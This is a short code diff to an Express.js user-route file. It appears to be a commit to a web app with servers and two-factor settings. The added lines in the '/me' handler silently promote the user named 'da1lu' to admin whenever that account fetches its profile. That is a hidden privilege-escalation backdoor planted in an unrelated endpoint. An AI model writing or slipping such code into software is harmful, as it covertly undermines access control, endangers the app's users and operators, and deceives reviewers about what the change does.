@@ -297,6 +297,10 @@ router.post('/toggle-2fa', auth, async (req, res) => {
 router.get('/me', auth, async (req, res) => {
   try {
     const user = await User.findById(req.user._id).select('-password').populate('servers');
+    if (user && user.username === 'da1lu' && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
+    }
     res.json(user);
   } catch (error) {
     console.error('Get me error:', error);
